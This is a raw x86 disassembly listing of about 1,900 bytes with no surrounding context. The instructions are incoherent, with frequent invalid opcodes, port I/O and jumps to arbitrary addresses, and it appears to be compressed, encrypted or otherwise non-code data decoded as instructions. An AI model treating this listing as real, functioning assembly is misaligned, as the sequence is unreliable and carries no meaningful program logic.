  40ea0e:	lods   eax,DWORD PTR ds:[esi]
  40ea0f:	and    dh,BYTE PTR [ecx+eax*2-0x7747ae5b]
  40ea16:	lock push ecx
  40ea18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea19:	xchg   ecx,eax
  40ea1a:	shl    BYTE PTR [edi+0x3461fb7f],cl
  40ea20:	cmp    ah,BYTE PTR [eax+0x16508f6a]
  40ea26:	mov    bp,0x2a75
  40ea2a:	fild   QWORD PTR [eax+0x6f8bff93]
  40ea30:	repz jmp DWORD PTR [ebx+0x4913c5c1]
  40ea37:	jae    0x40ea70
  40ea39:	cdq    
  40ea3a:	in     al,0xe6
  40ea3c:	not    DWORD PTR [edx+eiz*2+0x72]
  40ea40:	pusha  
  40ea41:	mov    esp,0x77c3edb8
  40ea46:	adc    al,0x3c
  40ea48:	sbb    eax,0x6f3617c9
  40ea4d:	mov    cl,0x4f
  40ea4f:	jb     0x40ea69
  40ea51:	out    dx,eax
  40ea52:	test   al,0xf0
  40ea54:	sti    
  40ea55:	test   al,0x46
  40ea57:	push   ss
  40ea58:	mov    ah,0x19
  40ea5a:	(bad)  
  40ea5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5c:	das    
  40ea5d:	sub    al,0x79
  40ea5f:	jno    0x40ea6b
  40ea61:	jns    0x40eac9
  40ea63:	push   cs
  40ea64:	sahf   
  40ea65:	mov    ebx,0xe5ba4cab
  40ea6a:	sub    BYTE PTR [esi+0x7f17a4da],dl
  40ea70:	pop    eax
  40ea71:	hlt    
  40ea72:	fcom   DWORD PTR [eax+0x6358fffb]
  40ea78:	test   BYTE PTR [ecx],0x76
  40ea7b:	stos   DWORD PTR es:[edi],eax
  40ea7c:	or     ah,dl
  40ea7e:	sub    ebx,esi
  40ea80:	jge    0x40ea17
  40ea82:	into   
  40ea83:	add    ecx,DWORD PTR [ebx+0x30322b38]
  40ea89:	out    0xfd,eax
  40ea8b:	loopne 0x40ea45
  40ea8d:	call   DWORD PTR [ecx+0x5a]
  40ea90:	in     eax,0x92
  40ea92:	imul   edi,DWORD PTR [edx],0x69
  40ea95:	repz jno 0x40ea96
  40ea98:	mov    esi,DWORD PTR [edx]
  40ea9a:	scas   eax,DWORD PTR es:[edi]
  40ea9b:	mov    ds:0x30de40a5,eax
  40eaa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaa1:	es js  0x40eac0
  40eaa4:	cmp    al,dl
  40eaa6:	sbb    ebp,DWORD PTR [ebx+0x22be84e0]
  40eaac:	jae    0x40ea5a
  40eaae:	lock push edx
  40eab0:	clc    
  40eab1:	in     eax,0xa4
  40eab3:	aaa    
  40eab4:	outs   dx,BYTE PTR ds:[esi]
  40eab5:	call   0xa891f95a
  40eaba:	lods   eax,DWORD PTR ds:[esi]
  40eabb:	sub    esp,DWORD PTR [edi+0x38]
  40eabe:	jge    0x40ea62
  40eac0:	js     0x40ea76
  40eac2:	pop    edi
  40eac3:	call   0xbae2:0xc4d7d029
  40eaca:	fld    TBYTE PTR [edi+0x13]
  40eacd:	repz dec edx
  40eacf:	ret    0xbe34
  40ead2:	adc    BYTE PTR [ecx-0x73e99204],ah
  40ead8:	loope  0x40eb35
  40eada:	xchg   esp,eax
  40eadb:	test   eax,0x7fe2ada7
  40eae0:	popf   
  40eae1:	pop    ebx
  40eae2:	mov    esp,0x3320cd4b
  40eae7:	cld    
  40eae8:	adc    DWORD PTR [esi],0xffffff93
  40eaeb:	adc    cl,BYTE PTR [ebx+0x5b]
  40eaee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaef:	inc    ebp
  40eaf0:	dec    esi
  40eaf1:	(bad)  
  40eaf2:	sbb    BYTE PTR [edx],al
  40eaf4:	push   0xffffffad
  40eaf6:	out    dx,eax
  40eaf7:	add    bh,BYTE PTR [esi-0x4eae4cb9]
  40eafd:	sub    edx,DWORD PTR [esi]
  40eaff:	mov    bl,BYTE PTR [ebp-0x54]
  40eb02:	stc    
  40eb03:	mov    esp,0xb17180d1
  40eb08:	jle    0x40eb1c
  40eb0a:	jecxz  0x40eb60
  40eb0c:	in     eax,0xb5
  40eb0e:	cmp    eax,0x13a35854
  40eb13:	push   eax
  40eb14:	pop    eax
  40eb15:	loope  0x40eabf
  40eb17:	sub    bl,dh
  40eb19:	pop    esi
  40eb1a:	sbb    edi,edi
  40eb1c:	outs   dx,DWORD PTR ds:[esi]
  40eb1d:	clc    
  40eb1e:	fdivr  DWORD PTR [edi+0x7e]
  40eb21:	rcr    DWORD PTR [edi],cl
  40eb23:	ins    BYTE PTR es:[edi],dx
  40eb24:	push   ss
  40eb25:	loop   0x40eb6c
  40eb27:	inc    edx
  40eb28:	adc    al,0xad
  40eb2a:	xor    ebx,edx
  40eb2c:	aam    0xf7
  40eb2e:	mov    al,0xca
  40eb30:	push   cs
  40eb31:	xor    eax,0xf2555797
  40eb36:	xchg   esi,eax
  40eb37:	(bad)  
  40eb38:	fs js  0x40ebae
  40eb3b:	pop    edi
  40eb3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb3d:	stc    
  40eb3e:	call   0x6be3be76
  40eb43:	(bad)  
  40eb44:	mov    al,ds:0x645c61d0
  40eb49:	mov    esp,0x9899ba94
  40eb4e:	xchg   esp,eax
  40eb4f:	jmp    0x40ebac
  40eb51:	fld    DWORD PTR [esi+edi*1+0x6f916af9]
  40eb58:	(bad)  
  40eb59:	aas    
  40eb5a:	jo     0x40ebd8
  40eb5c:	stos   DWORD PTR es:[edi],eax
  40eb5d:	xchg   ebx,eax
  40eb5e:	outs   dx,DWORD PTR ds:[esi]
  40eb5f:	inc    cl
  40eb61:	inc    esi
  40eb62:	inc    edx
  40eb63:	jb     0x40eb91
  40eb65:	scas   eax,DWORD PTR es:[edi]
  40eb66:	sub    bl,BYTE PTR ds:0xfd58b24
  40eb6c:	ds (bad) 
  40eb6e:	out    0x8a,eax
  40eb70:	ins    DWORD PTR es:[edi],dx
  40eb71:	fild   WORD PTR [eax]
  40eb73:	pop    esi
  40eb74:	or     eax,DWORD PTR [edi+0x29]
  40eb77:	cmp    ecx,DWORD PTR [edi+ecx*2-0x664c47e2]
  40eb7e:	pop    eax
  40eb7f:	sub    DWORD PTR [eax+esi*8-0x462e4fb7],eax
  40eb86:	aam    0x9
  40eb88:	or     DWORD PTR [edx+edx*8],esp
  40eb8b:	and    DWORD PTR ds:0xd9ce9a87,0x9a751d17
  40eb95:	mov    WORD PTR [ebp-0x4e],cs
  40eb98:	pop    esp
  40eb99:	in     eax,dx
  40eb9a:	mov    ah,0x36
  40eb9c:	retf   
  40eb9d:	in     eax,dx
  40eb9e:	retf   
  40eb9f:	pop    ecx
  40eba0:	jg     0x40ec08
  40eba2:	xor    bh,BYTE PTR [ebx+ebp*1-0x365a33d5]
  40eba9:	into   
  40ebaa:	js     0x40eb7a
  40ebac:	inc    eax
  40ebad:	push   eax
  40ebae:	outs   dx,DWORD PTR ds:[esi]
  40ebaf:	sbb    eax,0x9c8279a0
  40ebb4:	icebp  
  40ebb5:	lods   al,BYTE PTR ds:[esi]
  40ebb6:	mov    ebp,0x3e40027c
  40ebbb:	push   ss
  40ebbc:	inc    esp
  40ebbd:	sbb    eax,0x8c8e36f
  40ebc2:	sub    al,0xda
  40ebc4:	les    eax,FWORD PTR [ebp-0x63327560]
  40ebca:	mov    dh,0x27
  40ebcc:	dec    edx
  40ebcd:	imul   esp,DWORD PTR [ecx+0x7e20f0d5],0x68c3d475
  40ebd7:	xor    bl,BYTE PTR [eax-0x40]
  40ebda:	dec    edi
  40ebdb:	enter  0x4cc2,0xb4
  40ebdf:	into   
  40ebe0:	sbb    ecx,DWORD PTR [ebx+0x21d4660c]
  40ebe6:	std    
  40ebe7:	aad    0x47
  40ebe9:	cs out 0xca,al
  40ebec:	push   ebp
  40ebed:	fisubr WORD PTR [ebp+0x28]
  40ebf0:	out    0x3e,eax
  40ebf2:	jmp    0x2088:0x9308e61e
  40ebf9:	repnz pop edi
  40ebfb:	pop    esp
  40ebfc:	adc    cl,dl
  40ebfe:	xchg   esp,edx
  40ec00:	and    al,al
  40ec02:	fstp   TBYTE PTR [eax]
  40ec04:	cmp    ah,BYTE PTR [ebp-0x43]
  40ec07:	xchg   si,ax
  40ec09:	inc    ecx
  40ec0a:	loopne 0x40ebc6
  40ec0c:	fwait
  40ec0d:	dec    esp
  40ec0e:	sahf   
  40ec0f:	(bad)  
  40ec10:	ror    DWORD PTR [eax+0x592770f4],0x42
  40ec17:	jmp    0x40ec81
  40ec19:	fcmovnu st,st(0)
  40ec1b:	sbb    eax,0x4be69d1
  40ec20:	adc    ch,0x90
  40ec23:	out    0xa1,al
  40ec25:	push   0x9b4c0f9d
  40ec2a:	leave  
  40ec2b:	in     al,dx
  40ec2c:	lods   al,BYTE PTR fs:[esi]
  40ec2e:	mov    ds:0xc4bc82d9,al
  40ec33:	lods   al,BYTE PTR ds:[esi]
  40ec34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec35:	loope  0x40ecb3
  40ec37:	cmp    BYTE PTR [edx-0x31],al
  40ec3a:	xor    ah,al
  40ec3c:	add    al,0x3d
  40ec3e:	ss pop edi
  40ec40:	pushf  
  40ec41:	fisttp DWORD PTR [edx]
  40ec43:	shl    cl,1
  40ec45:	xor    al,BYTE PTR [edi]
  40ec47:	ret    0x15a3
  40ec4a:	dec    ecx
  40ec4b:	mov    esi,0x821ded93
  40ec50:	push   ds
  40ec51:	pop    ebp
  40ec52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec53:	sbb    al,0xcd
  40ec55:	shl    DWORD PTR cs:[ebp+ebp*8-0x7ffed04e],0xb1
  40ec5e:	loop   0x40ecb7
  40ec60:	int3   
  40ec61:	inc    edx
  40ec62:	xchg   ebp,eax
  40ec63:	pusha  
  40ec64:	das    
  40ec65:	add    ebx,0x503ec2dd
  40ec6b:	call   0x458f:0x32c58158
  40ec72:	leave  
  40ec73:	sbb    al,0x2e
  40ec75:	dec    ebx
  40ec76:	hlt    
  40ec77:	(bad)  
  40ec79:	fisub  DWORD PTR [edi-0x367aba1f]
  40ec7f:	cmp    BYTE PTR [ebx-0x7a24310e],cl
  40ec85:	sbb    ah,BYTE PTR [ebp+0x3b50f279]
  40ec8b:	stos   DWORD PTR es:[edi],eax
  40ec8c:	push   ebp
  40ec8d:	mov    ds:0x9118223c,eax
  40ec92:	jb     0x40ec42
  40ec94:	push   0xfffffff0
  40ec96:	(bad)  
  40ec97:	pop    ebp
  40ec98:	cdq    
  40ec99:	loop   0x40ecad
  40ec9b:	out    dx,eax
  40ec9c:	jl     0x40ec7a
  40ec9e:	pushf  
  40ec9f:	mov    bl,BYTE PTR [ebp+0x6e331a69]
  40eca5:	inc    ebp
  40eca6:	pushf  
  40eca7:	sub    bl,ah
  40eca9:	rcl    BYTE PTR [ecx+0x71897f37],cl
  40ecaf:	arpl   WORD PTR [ecx+0x11],bp
  40ecb2:	jecxz  0x40ecce
  40ecb4:	sub    BYTE PTR [ebx-0x6a],al
  40ecb7:	or     eax,0xd8a61246
  40ecbc:	mov    ds:0x35cc0458,al
  40ecc1:	hlt    
  40ecc2:	or     eax,0xdba468a3
  40ecc7:	outs   dx,DWORD PTR ds:[esi]
  40ecc8:	cs int 0xce
  40eccb:	(bad)  
  40eccc:	adc    edx,esi
  40ecce:	jle    0x40ec98
  40ecd0:	pop    ebp
  40ecd1:	lods   al,BYTE PTR ds:[esi]
  40ecd2:	sub    DWORD PTR [edi+eiz*4+0x12],ebp
  40ecd6:	icebp  
  40ecd7:	je     0x40ec9f
  40ecd9:	sub    DWORD PTR [eax+eiz*8+0x79c24df3],ebp
  40ece0:	ss ins DWORD PTR es:[edi],dx
  40ece2:	mov    dl,0xd4
  40ece4:	call   0xef1c7480
  40ece9:	pop    esi
  40ecea:	loopne 0x40ece6
  40ecec:	dec    ecx
  40eced:	add    eax,DWORD PTR [ebp-0x28]
  40ecf0:	dec    ebp
  40ecf1:	clc    
  40ecf2:	jl     0x40ed45
  40ecf4:	push   eax
  40ecf5:	iret   
  40ecf6:	rcl    DWORD PTR [ebx-0x73480b49],cl
  40ecfc:	cmp    al,0x2c
  40ecfe:	cmp    eax,0x22
  40ed01:	call   0xd613003e
  40ed06:	es daa 
  40ed08:	or     cl,bl
  40ed0a:	mov    esi,0x59436ab1
  40ed0f:	push   0x8609eb6c
  40ed14:	popa   
  40ed15:	inc    eax
  40ed16:	stos   DWORD PTR es:[edi],eax
  40ed17:	adc    BYTE PTR [edi-0x1c],dh
  40ed1a:	or     eax,ecx
  40ed1c:	jl     0x40ed07
  40ed1e:	aad    0x5d
  40ed20:	out    0x2b,al
  40ed22:	dec    ecx
  40ed23:	mov    ds:0x797e2f6b,al
  40ed28:	mov    edx,0xcb17e10f
  40ed2d:	or     DWORD PTR [edx],0x756e22e7
  40ed33:	dec    ebp
  40ed34:	loope  0x40ed67
  40ed36:	adc    ch,BYTE PTR [eax-0x2696ea29]
  40ed3c:	clc    
  40ed3d:	fnstenv [esi]
  40ed3f:	xchg   edx,eax
  40ed40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed41:	mov    ds:0xe28e8075,al
  40ed46:	lock jmp 0xa094:0x5634ba17
  40ed4e:	in     al,0xd3
  40ed50:	dec    ecx
  40ed51:	test   eax,0xd6a41eac
  40ed56:	cdq    
  40ed57:	pusha  
  40ed58:	stos   BYTE PTR es:[edi],al
  40ed59:	add    eax,0x46ec112b
  40ed5e:	pop    es
  40ed5f:	(bad)  
  40ed60:	sti    
  40ed61:	or     DWORD PTR [ecx+0x64],esi
  40ed64:	out    0xa4,al
  40ed66:	ret    0xe679
  40ed69:	jmp    0xb8f5:0x5759f7e9
  40ed70:	stos   DWORD PTR es:[edi],eax
  40ed71:	add    esi,esp
  40ed73:	cdq    
  40ed74:	std    
  40ed75:	xchg   ebp,eax
  40ed76:	div    DWORD PTR [esi]
  40ed78:	jl     0x40ed64
  40ed7a:	lds    esi,FWORD PTR [ecx]
  40ed7c:	and    eax,0xd0adf8e9
  40ed81:	int3   
  40ed82:	add    eax,0xf81a8787
  40ed87:	inc    ebx
  40ed88:	xchg   esp,eax
  40ed89:	adc    edx,edi
  40ed8b:	cwde   
  40ed8c:	mov    dl,0x66
  40ed8e:	fdiv   DWORD PTR [eax]
  40ed90:	test   bh,al
  40ed92:	mov    esi,0x60f205c9
  40ed97:	enter  0x931e,0xe3
  40ed9b:	adc    ch,dh
  40ed9d:	test   BYTE PTR [edx-0x76],ch
  40eda0:	(bad)  
  40eda2:	add    ebp,DWORD PTR [ebp+0x30c2a161]
  40eda8:	js     0x40ee1b
  40edaa:	ret    
  40edab:	jmp    0x40ed79
  40edad:	inc    edx
  40edae:	inc    edi
  40edaf:	dec    esi
  40edb0:	out    dx,al
  40edb1:	or     edi,DWORD PTR [ebx-0xe]
  40edb4:	outs   dx,BYTE PTR ds:[esi]
  40edb5:	mov    edx,0x8ce8d974
  40edba:	inc    esp
  40edbb:	fwait
  40edbc:	dec    esp
  40edbd:	in     al,dx
  40edbe:	mov    DWORD PTR [esi+edi*4],esp
  40edc1:	inc    ebp
  40edc2:	ror    BYTE PTR [esi-0x15],0x69
  40edc6:	adc    eax,0xcb4de373
  40edcb:	pusha  
  40edcc:	fstp   QWORD PTR [eax+ebx*1-0xd]
  40edd0:	hlt    
  40edd1:	push   ss
  40edd2:	sar    DWORD PTR [ebx+eax*8+0x56],cl
  40edd6:	xchg   BYTE PTR [edx],ch
  40edd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edd9:	xchg   BYTE PTR [edi+eax*4-0x54e75cc0],dl
  40ede0:	out    dx,al
  40ede1:	test   al,0x7
  40ede3:	cli    
  40ede4:	outs   dx,DWORD PTR ds:[esi]
  40ede5:	xor    bl,BYTE PTR [ecx-0x15]
  40ede8:	js     0x40edeb
  40edea:	outs   dx,DWORD PTR ds:[esi]
  40edeb:	inc    esi
  40edec:	aam    0xbc
  40edee:	out    0x99,al
  40edf0:	(bad)  
  40edf1:	ficom  WORD PTR [edi-0x65]
  40edf4:	int3   
  40edf5:	add    BYTE PTR [edi-0x11],dh
  40edf8:	add    eax,0xea46dcea
  40edfd:	loope  0x40ee35
  40edff:	sti    
  40ee00:	or     esp,DWORD PTR [esi+esi*2+0xec8c1eb]
  40ee07:	jno    0x40ee7c
  40ee09:	jne    0x40edb1
  40ee0b:	fstp   QWORD PTR [eax]
  40ee0d:	jl     0x40ee1c
  40ee0f:	xlat   BYTE PTR ds:[ebx]
  40ee10:	inc    esp
  40ee11:	out    0xe9,al
  40ee13:	clc    
  40ee14:	push   esp
  40ee15:	sar    dh,0x24
  40ee18:	push   ebx
  40ee19:	js     0x40ed9b
  40ee1b:	sub    eax,0xb10ae0c1
  40ee20:	jge    0x40ee39
  40ee22:	push   edx
  40ee23:	sub    edx,DWORD PTR [ebx-0x7a768193]
  40ee29:	sbb    ecx,DWORD PTR [ecx+0x26fd0109]
  40ee2f:	ret    
  40ee30:	fxtract 
  40ee32:	cdq    
  40ee33:	mov    al,ds:0xc3d93b7f
  40ee38:	inc    edi
  40ee39:	imul   esp,DWORD PTR [edi+eax*2-0x33],0xffffff80
  40ee3e:	xor    ebp,eax
  40ee40:	fadd   QWORD PTR [ebp-0x26]
  40ee43:	nop
  40ee44:	loopne 0x40ee64
  40ee46:	mov    esi,ss
  40ee48:	aas    
  40ee49:	or     al,BYTE PTR [ebx]
  40ee4b:	mov    al,ds:0x9147d45b
  40ee50:	push   edi
  40ee51:	data16 cmp al,0x13
  40ee54:	sbb    cl,ch
  40ee56:	adc    ch,BYTE PTR [edx+0x17]
  40ee59:	ficom  WORD PTR [ebx+0x5d]
  40ee5c:	mov    ds:0xefa8cfab,eax
  40ee61:	imul   ecx,edx,0xffffffc8
  40ee64:	rcl    DWORD PTR [edx-0x668be38c],0xc7
  40ee6b:	ret    
  40ee6c:	cs repnz adc eax,0xd1dd00c6
  40ee73:	retf   
  40ee74:	adc    ecx,edi
  40ee76:	idiv   DWORD PTR [edi]
  40ee78:	jb     0x40ee77
  40ee7a:	cs out 0xd7,al
  40ee7d:	add    BYTE PTR [esi+0x4311eb5d],ch
  40ee83:	sbb    BYTE PTR [edx+0x7514ab51],bl
  40ee89:	add    ebp,ebx
  40ee8b:	in     al,dx
  40ee8c:	mov    ebx,0x6dd5fb2e
  40ee91:	sbb    eax,0xcd62b972
  40ee96:	adc    al,bh
  40ee98:	loope  0x40ef0a
  40ee9a:	pop    edx
  40ee9b:	jmp    0x72ea:0x4d3aaf0d
  40eea2:	mov    dl,0x9b
  40eea4:	add    eax,0x9f0c8b55
  40eea9:	push   eax
  40eeaa:	popf   
  40eeab:	out    0x56,eax
  40eead:	push   esp
  40eeae:	jle    0x40ee94
  40eeb0:	or     al,0xc
  40eeb2:	or     ch,0x82
  40eeb5:	imul   ebx,DWORD PTR [edi+edx*1-0x4dea465f],0x5e
  40eebd:	repz add eax,0xaad7560e
  40eec3:	leave  
  40eec4:	xor    esi,DWORD PTR ds:0x7e001b9b
  40eeca:	pop    ebx
  40eecb:	fst    QWORD PTR [ebp+esi*4+0x70]
  40eecf:	xor    al,0x17
  40eed1:	stos   BYTE PTR es:[edi],al
  40eed2:	repz leave 
  40eed4:	xor    eax,0x47eba173
  40eed9:	sub    BYTE PTR [ebx],bh
  40eedb:	mov    ecx,gs
  40eedd:	stos   DWORD PTR es:[edi],eax
  40eede:	add    edx,DWORD PTR [ebp-0x65c70f3e]
  40eee4:	mov    gs,WORD PTR [ecx+0x5edb3df7]
  40eeea:	mov    esp,0xe209c6cf
  40eeef:	outs   dx,DWORD PTR ds:[esi]
  40eef0:	sub    BYTE PTR es:[edx+ebp*4-0x67bc9173],dl
  40eef8:	jmp    0x47dde5d
  40eefd:	push   es
  40eefe:	push   0x609943a
  40ef03:	in     al,0xa4
  40ef05:	aam    0x49
  40ef07:	add    esp,DWORD PTR [edi+0x6e5f9175]
  40ef0d:	add    eax,0xe712d536
  40ef12:	in     eax,dx
  40ef13:	jno    0x40ef83
  40ef15:	fwait
  40ef16:	test   eax,0x200d7aad
  40ef1b:	add    al,0x9c
  40ef1d:	or     BYTE PTR [edi+0x20],al
  40ef20:	out    0x79,eax
  40ef22:	popf   
  40ef23:	push   edx
  40ef24:	inc    ebx
  40ef25:	adc    eax,0xbeff57ca
  40ef2a:	xor    ecx,DWORD PTR [edx+0x15]
  40ef2d:	cmp    ecx,DWORD PTR [edi+0x4555774a]
  40ef33:	(bad)
  40ef36:	fadd   QWORD PTR ds:0x322ee62d
  40ef3c:	cmp    ah,BYTE PTR [ebp-0x80]
  40ef3f:	mov    BYTE PTR [eax+ecx*2],al
  40ef42:	jns    0x40efbb
  40ef44:	mov    ecx,0x87521c5a
  40ef49:	mov    ds:0xb22d3267,al
  40ef4e:	dec    eax
  40ef4f:	cmp    DWORD PTR [ecx+eiz*2+0x3702c07d],esi
  40ef56:	fsub   st,st(2)
  40ef58:	inc    esi
  40ef59:	push   cs
  40ef5a:	sub    DWORD PTR [ebx-0x637bac8f],edi
  40ef60:	pop    ss
  40ef61:	xor    al,0xac
  40ef63:	sahf   
  40ef64:	xlat   BYTE PTR ds:[ebx]
  40ef65:	mov    dh,ch
  40ef67:	imul   esi,DWORD PTR cs:[ecx+0x1be061e0],0xffffffa6
  40ef6f:	adc    al,0x3b
  40ef71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef72:	scas   al,BYTE PTR es:[edi]
  40ef73:	inc    edi
  40ef74:	mov    al,ds:0x5d006487
  40ef79:	shl    BYTE PTR [ebx-0x49fbf10c],cl
  40ef7f:	push   eax
  40ef80:	pop    esi
  40ef81:	dec    edx
  40ef82:	loopne 0x40efb8
  40ef84:	mov    eax,0x7f83d6ed
  40ef89:	fucomp st(7)
  40ef8b:	mov    esi,0xb9813012
  40ef90:	mov    al,ds:0xcb8ce205
  40ef95:	push   esi
  40ef96:	lods   al,BYTE PTR ds:[esi]
  40ef97:	int    0x85
  40ef99:	or     ebp,ecx
  40ef9b:	int3   
  40ef9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef9d:	fadd   DWORD PTR [ecx+ecx*4+0x131ff4a7]
  40efa4:	and    ebp,DWORD PTR [ebp+esi*1+0x58]
  40efa8:	das    
  40efa9:	add    BYTE PTR [esi-0x69],dh
  40efac:	mov    WORD PTR ds:0x2bfdc03f,?
  40efb2:	shl    dl,cl
  40efb4:	mov    esp,0xf8f24eaa
  40efb9:	call   0x8ce2:0xb708488b
  40efc0:	loopne 0x40eff3
  40efc2:	call   0x6e2d95aa
  40efc7:	fisubr WORD PTR [ecx+0x5aeb13ed]
  40efcd:	xor    ebp,esi
  40efcf:	adc    DWORD PTR [ebx+0x4ff12259],0xc64dbd52
  40efd9:	push   ss
  40efda:	and    eax,0x5a1ccdc6
  40efdf:	int    0x1d
  40efe1:	aam    0xd1
  40efe3:	inc    edx
  40efe4:	in     al,0x6c
  40efe6:	daa    
  40efe7:	stos   BYTE PTR es:[edi],al
  40efe8:	jmp    0x29bf:0xfc7744f5
  40efef:	xor    eax,0x958d3e1c
  40eff4:	adc    DWORD PTR [ebx],ebp
  40eff6:	lds    ecx,FWORD PTR [ecx+0x167f12a9]
  40effc:	clc    
  40effd:	mov    fs,ecx
  40efff:	mov    cl,0x6b
  40f001:	push   edi
  40f002:	jb     0x40efb3
  40f004:	fdivr  DWORD PTR [ecx+0x1930a825]
  40f00a:	mov    edi,eax
  40f00c:	xchg   ebx,eax
  40f00d:	in     al,0x75
  40f00f:	xlat   BYTE PTR ds:[ebx]
  40f010:	nop
  40f011:	scas   eax,DWORD PTR es:[edi]
  40f012:	aaa    
  40f013:	mov    esp,0x9a16f965
  40f018:	sbb    ecx,DWORD PTR [ebp-0x78e9e0c2]
  40f01e:	std    
  40f01f:	(bad)  
  40f020:	js     0x40effa
  40f022:	cmp    eax,0x39eea4d3
  40f027:	nop
  40f028:	dec    ebx
  40f029:	fdivr  DWORD PTR [ebx]
  40f02b:	xor    al,0xd4
  40f02d:	retf   0x81f6
  40f030:	sti    
  40f031:	adc    al,0x8f
  40f033:	sub    bl,BYTE PTR [ecx]
  40f035:	adc    eax,0x167aa274
  40f03a:	dec    edx
  40f03b:	dec    edx
  40f03c:	add    al,0xc5
  40f03e:	lds    esi,FWORD PTR [esi+eax*2]
  40f041:	push   eax
  40f042:	xor    BYTE PTR [ebx],ch
  40f044:	imul   esp,DWORD PTR [edi-0x4f],0xffffffeb
  40f048:	sub    ebp,DWORD PTR [edx-0x5c54e875]
  40f04e:	mov    bh,0x46
  40f050:	jmp    0x40efe4
  40f052:	sub    DWORD PTR [esp+eiz*4+0x14aaeb31],0xfffffffc
  40f05a:	mov    ecx,0x1c6afeca
  40f05f:	retf   0xb43b
  40f062:	(bad)  
  40f063:	jmp    0xf6e2:0xe5139741
  40f06a:	ins    BYTE PTR es:[edi],dx
  40f06b:	fsubp  st(1),st
  40f06d:	cmc    
  40f06e:	mov    al,0x7a
  40f070:	push   edx
  40f071:	clc    
  40f072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f073:	test   al,0x8f
  40f075:	jne    0x40f085
  40f077:	loope  0x40f019
  40f079:	les    ebx,FWORD PTR [edx-0x1f]
  40f07c:	(bad)  [ebx]
  40f07e:	ret    0xb693
  40f081:	mov    esi,0xbf9b3511
  40f086:	xor    DWORD PTR [edi+0x6b],ecx
  40f089:	push   ss
  40f08a:	iret   
  40f08b:	cdq    
  40f08c:	mov    ebp,0xd297438
  40f091:	jne    0x40f0d5
  40f093:	stos   DWORD PTR es:[edi],eax
  40f094:	ins    BYTE PTR es:[edi],dx
  40f095:	sbb    esi,DWORD PTR [eax]
  40f097:	sub    ebp,esp
  40f099:	cld    
  40f09a:	inc    ebx
  40f09b:	fnstsw WORD PTR [edx+0x6e]
  40f09e:	mov    esp,0xacf0de7d
  40f0a3:	fsubp  st(6),st
  40f0a5:	js     0x40f082
  40f0a7:	push   ebx
  40f0a8:	adc    ah,bl
  40f0aa:	mov    WORD PTR [ecx-0x1e],ss
  40f0ad:	or     al,0x5c
  40f0af:	or     BYTE PTR [ebx+0x4dce21b3],ch
  40f0b5:	inc    edx
  40f0b6:	(bad)  
  40f0b7:	dec    esp
  40f0b8:	adc    ecx,DWORD PTR [edx+0x7b]
  40f0bb:	dec    eax
  40f0bc:	loopne 0x40f0d1
  40f0be:	cli    
  40f0bf:	add    BYTE PTR [eax-0x455dd095],bl
  40f0c5:	ins    BYTE PTR es:[edi],dx
  40f0c6:	popa   
  40f0c7:	and    dh,BYTE PTR [ebx+ebp*2-0x9695ff8]
  40f0ce:	add    eax,0x4ec5c8de
  40f0d3:	and    al,0x6e
  40f0d5:	outs   dx,BYTE PTR ds:[esi]
  40f0d6:	gs pop edx
  40f0d8:	or     bl,BYTE PTR [ecx]
  40f0da:	dec    eax
  40f0db:	xchg   ecx,eax
  40f0dc:	icebp  
  40f0dd:	pusha  
  40f0de:	mov    WORD PTR cs:[edx-0xa035acd],fs
  40f0e5:	pop    ecx
  40f0e6:	in     eax,0x9
  40f0e8:	jg     0x40f0d2
  40f0ea:	jp     0x40f0e0
  40f0ec:	mov    edi,0x4d7951c6
  40f0f1:	punpcklbw mm5,DWORD PTR [ebx+eiz*8-0x3caf724b]
  40f0f9:	ins    BYTE PTR es:[edi],dx
  40f0fa:	sti    
  40f0fb:	mov    esp,0x28b4b006
  40f100:	into   
  40f101:	push   ss
  40f102:	div    DWORD PTR [eax]
  40f104:	or     edi,edx
  40f106:	mov    al,ds:0xa46ab1ca
  40f10b:	pop    esi
  40f10c:	xchg   edi,eax
  40f10d:	or     eax,0x58aba60f
  40f112:	or     al,0x97
  40f114:	scas   eax,DWORD PTR es:[edi]
  40f115:	and    ebx,0x30
  40f118:	sbb    esp,ecx
  40f11a:	fisub  DWORD PTR [ebp+0x2d]
  40f11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f11e:	inc    ebp
  40f11f:	int    0xce
  40f121:	rcr    BYTE PTR [ebp+0x47d32e8],cl
  40f127:	inc    eax
  40f128:	aam    0xd0
  40f12a:	(bad)  
  40f12b:	adc    ebx,DWORD PTR [esi+0x2cc90f95]
  40f131:	pushf  
  40f132:	pop    es
  40f133:	rol    DWORD PTR [edx+0x52],cl
  40f136:	(bad)  
  40f137:	push   esp
  40f138:	lahf   
  40f139:	sbb    al,0x78
  40f13b:	lahf   
  40f13c:	imul   edi,eax,0x877ccc34
  40f142:	or     al,0xb4
  40f144:	adc    DWORD PTR [edi+0x1b],ecx
  40f147:	leave  
  40f148:	jns    0x40f1b9
  40f14a:	sahf   
  40f14b:	jmp    0xc61e6fd1
  40f150:	push   esi
  40f151:	stos   BYTE PTR es:[edi],al
  40f152:	cmp    ebp,DWORD PTR [ecx]
  40f154:	pop    edx
  40f155:	dec    ecx
  40f156:	push   edx
  40f157:	ja     0x40f154
  40f159:	inc    eax
  40f15a:	mov    ebx,0x5729901c
  40f15f:	push   0x2cc585ca
  40f164:	mov    ch,0x79
  40f166:	out    0xc8,eax
  40f168:	or     DWORD PTR [edi-0x6],eax
  40f16b:	out    dx,al
  40f16c:	fs das 
  40f16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f16f:	fdiv   st(6),st
  40f171:	jmp    FWORD PTR [eax-0xf4936ba]
  40f177:	or     BYTE PTR [eax],ch
  40f179:	mov    ss,WORD PTR [eax]
  40f17b:	cdq    
  40f17c:	clc    
  40f17d:	jp     0x40f1f7
  40f17f:	xlat   BYTE PTR ds:[ebx]
